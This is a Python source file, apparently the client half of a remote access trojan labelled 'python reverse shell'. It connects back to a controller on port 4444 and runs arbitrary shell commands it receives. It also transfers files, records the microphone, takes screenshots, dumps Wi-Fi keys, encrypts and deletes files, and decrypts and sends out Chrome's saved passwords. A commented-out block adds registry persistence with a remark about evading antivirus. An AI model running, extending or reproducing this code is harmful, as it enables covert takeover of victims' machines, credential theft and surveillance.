#!/usr/bin/python
# -*- coding: utf-8 -*-
##############################
#   **python reverse shell**
# coded by: oseid Aldary
# updated by: Annor Gyimah
##############################
#Client_FILE
import struct,socket,subprocess,os,platform,webbrowser as browser
import pyautogui
import time
from datetime import timezone, datetime, timedelta
import pyaudio
import wave
import shutil
import sqlite3
import sys
import base64
from io import BytesIO
from Crypto.Cipher import AES
from cryptography.fernet import Fernet
from win32 import win32crypt
import shutil
import json
import smtplib
from threading import Timer
import contextlib


class senrev:
    def __init__(self,sock):
        self.sock = sock
    def send(self, data):
        pkt = struct.pack('>I', len(data)) + data
        self.sock.sendall(pkt)
    def recv(self):
        pktlen = self.recvall(4)
        if not pktlen: return ""
        pktlen = struct.unpack('>I', pktlen)[0]
        return self.recvall(pktlen)
    def recvall(self, n):
        packet = b''
        while len(packet) < n:
            frame = self.sock.recv(n - len(packet))
            if not frame:return None
            packet += frame
        return packet

def cnet():
  try:
    ip = socket.gethostbyname("www.google.com")
    con = socket.create_connection((ip,80), 2)
    return True
  except socket.error: pass
  return False
def runCMD(cmd):
       runcmd = subprocess.Popen(cmd,
                                 shell=True,
                                 stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE,
                                 stdin=subprocess.PIPE)
       return runcmd.stdout.read() + runcmd.stderr.read()

def upload(cmd):
   filetosend = "".join(cmd.split(":download")).strip()
   if not os.path.isfile(filetosend): controler.send("error: open: '{}': No such file on clinet machine !\n".format(filetosend).encode("UTF-8"))
   else:
       controler.send(b"true")
       with open(filetosend, "rb") as wf:
        for data in iter(lambda: wf.read(4100), b""):
         try:controler.send(data)
         except(KeyboardInterrupt,EOFError):
          wf.close()
          controler.send(b":Aborted:")
          return
       controler.send(b":DONE:")

def wifishow():
  try:
    if platform.system() == "Windows": info = runCMD("netsh wlan show profile name=* key=clear")
    elif platform.system() == "Linux": info = runCMD("egrep -h -s -A 9 --color -T 'ssid=' /etc/NetworkManager/system-connections/*")
    else: info = b":osnot:"
  except Exception: info = b":osnot:"
  finally: controler.send(info)
  

def screenshot():
    controler.send(str.encode("image"))
    pic = pyautogui.screenshot()
    file_name = str(datetime.now().time()).split(".")[0].replace(":", "-")
    file_name = file_name + '.png'
    pic.save(file_name)
    with open(file_name, "rb") as file:
        while True:
            file_data = file.read()
            if not file_data:
                break
            controler.send(file_data)
    controler.send(str.encode("completeServing"))
    os.remove(file_name)




def recording():
    controler.send(str.encode("sound"))
    chunk = 1024
    sample_format = pyaudio.paInt16
    chanels = 2
    smpl_rt = 44400
    seconds = 10
    #filename = 'path_of_file.wav'

    filename = str(datetime.now().time())

    filename = filename.split(".")[0].replace(":", "-")
    filename = filename + '.wav'


    pa = pyaudio.PyAudio()

    stream = pa.open(format=sample_format, channels = chanels,
                 rate = smpl_rt, input=True,
                 frames_per_buffer=chunk)

    print('Recording....')
    frames = []

    for i in range(0, int(smpl_rt / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()

    pa.terminate()

    print('Done !!! ')

    sf = wave.open(filename, 'wb')
    sf.setnchannels(chanels)
    sf.setsampwidth(pa.get_sample_size(sample_format))
    sf.setframerate(smpl_rt)
    sf.writeframes(b''.join(frames))
    sf.close()

    with open(filename, "rb") as file:
        while True:
            file_data = file.read()
            if not file_data:
                break
            controler.send(file_data)
    controler.send(str.encode("completeServing"))
    os.remove(filename)



def delete(cmd):
     controler.send(str.encode("delete"))
     filetodel = "".join(cmd.split(":delete")).strip()
     try:
         os.remove(filetodel)
         print("Done Deleting")
     except:
         print("File is not found")
    




def generate_key():
    """
    Generates a key and saves it to a file named key.key
    """
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        key_file.write(key)

def load_key():
    """
    Loads the key from the key.key file and returns it
    """
    with open('key.key', 'rb') as key_file:
        key = key_file.read()
    return key

def encrypt_file(cmd):
    controler.send(str.encode("encrypt"))
    generate_key()
    filetoenc = "".join(cmd.split(":encrypt")).strip()
    filetoenc = filetoenc.split("/")[-1] if "/" in filetoenc else filetoenc.split("\\")[-1] if "\\" in filetoenc else filetoenc
    
   
    
    key = load_key()
    f = Fernet(key)

    with open(filetoenc, 'rb') as file:
        file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        
    
    with open(f"{filetoenc}.enc", 'wb') as file:
        file.write(encrypted_data)



def decrypt_file(cmd):
    controler.send(str.encode("decrypt"))
    
    filetodec = "".join(cmd.split(":decrypt")).strip()
    filetodec = str(filetodec.split("/")[-1] if "/" in filetodec else filetodec.split("\\")[-1] if "\\" in filetodec else filetodec)
   
    
    key = load_key()
    f = Fernet(key)
    with open(filetodec, 'rb') as file:
        encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)

    with open(f"{filetodec}.dec", 'wb') as file:
        file.write(decrypted_data)


def download(cmd):
     filetodown = "".join(cmd.split(":upload")).strip()
     filetodown = filetodown.split("/")[-1] if "/" in filetodown else filetodown.split("\\")[-1] if "\\" in filetodown else filetodown
     wf = open(filetodown, "wb")
     while True:
      data = controler.recv()
      if data == b":DONE:":break
      elif data == b":Aborted:":
        wf.close()
        os.remove(filetodown)
        return
      wf.write(data)
     wf.close()
     controler.send(str(os.getcwd()+os.sep+filetodown).encode("UTF-8"))
def browse(cmd):
    url = "".join(cmd.split(":browse")).strip()
    browser.open(url)



def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def main():
    # get the AES key
    key = get_encryption_key()
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
        else:
            continue
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        print("="*50)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        pass


def savedpass():
  try:
    with open("savedpass.txt",'w') as f:
      with contextlib.redirect_stdout(f):
        print(main())

    with open("savedpass.txt",'rb') as file:
      while True:
        file_data = file.read()
        if not file_data:
          break
        controler.send(file_data)
    os.remove(f"{filename}.txt")
  except:
      pass




def shell(senrev=senrev):
   global s
   global controler
   mainDIR = os.getcwd()
   tmpdir=""
   controler = senrev(s)
   while True:
     cmd = controler.recv()
     if cmd.strip():
       cmd = cmd.decode("UTF-8",'ignore').strip()
       if ":download" in cmd:upload(cmd)
       elif ":upload" in cmd:download(cmd)
       elif cmd == ":kill":
          s.shutdown(2)
          s.close()
          break
       elif ":browse" in cmd: browse(cmd)
       elif ":delete" in cmd: delete(cmd)
       elif ":recording" in cmd:
           recording()
       elif ":webcam" in cmd:
           webcam()
       elif ":passwords" in cmd:
           savedpass()
       elif ":encrypt" in cmd:
           encrypt_file(cmd)
       elif ":decrypt" in cmd:
           decrypt_file(cmd)
       elif ":screenshot" in cmd:
           screenshot()
       elif cmd == ":check_internet_connection":
          if cnet() == True: controler.send(b"UP")
          else: controler.send(b"Down")
       elif cmd == ":wifi": wifishow()
       elif "cd" in cmd:
               dirc = "".join(cmd.split("cd")).strip()
               if not dirc.strip() : controler.send("{}\n".format(os.getcwd()).encode("UTF-8"))
               elif dirc == "-": 
                 if not tmpdir: controler.send(b"error: cd: old [PAWD] not set yet !\n")
                 else:
                   tmpdir2 = os.getcwd()
                   os.chdir(tmpdir)
                   controler.send("Back to dir[ {}/ ]\n".format(tmpdir).encode("UTF-8"))
                   tmpdir = tmpdir2
               elif dirc =="--":
                  tmpdir = os.getcwd()
                  os.chdir(mainDIR)
                  controler.send("Back to first dir[ {}/ ]\n".format(mainDIR).encode("UTF-8"))
               else:
                 if not os.path.isdir(dirc): controler.send("error: cd: '{}': No such file or directory on clinet machine !\n".format(dirc).encode("UTF-8"))
                 else:
                     tmpdir = os.getcwd()
                     os.chdir(dirc)
                     controler.send("Changed to dir[ {}/ ]\n".format(dirc).encode("UTF-8"))
       elif cmd == "pwd": controler.send(str(os.getcwd()+"\n").encode("UTF-8"))
       else:
               cmd_output = runCMD(cmd)
               controler.send(bytes(cmd_output))
   exit(1)



'''
location = os.environ["appdata"] + "\\win32.exe" # name of copy stored for persistence
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location)
    subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v StartUp /t REG_SZ /d "' + location + '"', shell=True)

    file_name = sys._MEIPASS + "\image.jpg"
    try:
        subprocess.Popen(file_name, shell=True)
    except:
        number = 1
        number2 = 2  #pointless function for bypassing AV
        number3 = number + number2


'''

IPs = ['127.0.0.1']
port = 4444
while True:
    for IP in IPs:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, port))
            shell()
        except Exception:
            pass





